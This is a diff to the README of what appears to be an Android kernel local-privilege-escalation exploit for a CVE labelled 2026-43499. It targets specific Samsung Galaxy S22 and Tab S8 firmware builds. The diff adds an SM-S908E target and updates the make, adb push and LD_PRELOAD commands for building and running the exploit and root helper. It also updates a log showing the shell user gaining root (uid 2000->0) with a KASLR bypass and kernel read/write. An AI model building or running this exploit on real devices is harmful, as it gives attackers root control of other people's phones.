@@ -36,9 +36,10 @@ The following pre-configured target profiles are included in `src/targets/<TARGE
 | **Galaxy S22+** | SM-S906E | `S906EXXSEGZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Global / Latin America / Asia / Africa |
 | **Galaxy S22 Ultra** | SM-S908B | `S908BXXSMGZB2` | **Samsung Exynos 2200** | Android 16 | Europe / International |
 | **Galaxy S22 Ultra** | SM-S908B | `S908BXXSNGZD7` | **Samsung Exynos 2200** | Android 16 | Europe / International |
+| **Galaxy S22 Ultra** | SM-S908E | `S908EXXSDGZB6` | **Qualcomm Snapdragon 8 Gen 1** | Android 14 | Global / India / Asia (Baseline Profile) |
 | **Galaxy S22 Ultra** | SM-S908E | `S908EXXSEGZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Global / Latin America / Asia / Africa |
 | **Galaxy S22 Ultra** | SM-S908N | `S908NKSS9GZE5` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | South Korea |
-| **Galaxy S22 Ultra** | SM-S908W | `S908WVLS8FYG7` | **Qualcomm Snapdragon 8 Gen 1** | Android 15 | Canada (Baseline Profile) |
+| **Galaxy S22 Ultra** | SM-S908W | `S908WVLS8FYG7` | **Qualcomm Snapdragon 8 Gen 1** | Android 15 | Canada |
 | **Galaxy S22 Ultra** | SM-S908W | `S908WVLSAGZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Canada |
 | **Galaxy S22 Ultra** | SCG14 | `SCG14KDS1EZE3` | **Qualcomm Snapdragon 8 Gen 1** | Android 16 | Japan (au KDDI) |
 | **Galaxy Tab S8 Ultra** | SM-X900 | `X900XXU9DYE5` | **Qualcomm Snapdragon 8 Gen 1** | Android 15 | Global (Wi-Fi) |
@@ -81,8 +82,8 @@ The upstream Apache License 2.0 is retained in [LICENSE](LICENSE), and attributi
 Set `ANDROID_NDK_HOME` to Android NDK r27+ or a compatible toolchain, then run with your chosen `PROJECT=<TARGET>` from the table above:
 
 ```sh
-# Example building for Galaxy S22 Ultra (SM-S908W):
-make PROJECT=S908WVLS8FYG7 clean preload root-helper
+# Example building for Galaxy S22 Ultra (SM-S908E):
+make PROJECT=S908EXXSDGZB6 clean preload root-helper
 
 # Or specify any target from the supported device list:
 # make PROJECT=S901BXXSNGZD7 clean preload root-helper   # Galaxy S22 (Exynos)
@@ -111,7 +112,7 @@ build/<TARGET>/bin/cve-exp32 (or cve-exp64 for 64-bit exp targets like BVK1)
 Push the binaries built for your target to the device:
 
 ```sh
-export TARGET=S908WVLS8FYG7  # Replace with your target name
+export TARGET=S908EXXSDGZB6  # Replace with your target name
 
 adb push build/$TARGET/bin/cve-2026-43499 /data/local/tmp/cve-2026-43499
 adb push build/$TARGET/bin/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
@@ -162,13 +163,13 @@ Override the attempt count or base delay when collecting timing data:
 adb shell "EXPLOIT_ATTEMPTS=24 PSELECT_DELAY_USEC=20000 LD_PRELOAD=/data/local/tmp/cve-2026-43499 sh"
 ```
 
-Verified result on `S908WVLS8FYG7`:
+Verified result on `S908EXXSDGZB6`:
 
 ```text
 [*] root umh result wake=1 complete=1 retval=0 socket=1
-[+] pipe-physrw-summary pid=5011 done=1 root=1 kaslr=1 base=ffffffc0080d8000 slide=00000000000d8000
-[+] pipe physrw pid=5011 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
-[+] stability keeper pid=28206 retaining reclaimed kernel pages
+[+] pipe-physrw-summary pid=22793 done=1 root=1 kaslr=1 base=ffffffc0081f0000 slide=00000000001f0000
+[+] pipe physrw pid=22793 done=1 root=1 kaslr=1 read_ok=1 write_ok=1 rw64=1/1 uid=2000->0
+[+] stability keeper pid=10824 retaining reclaimed kernel pages
 [+] exploit completed attempt=1/16
 ```
 
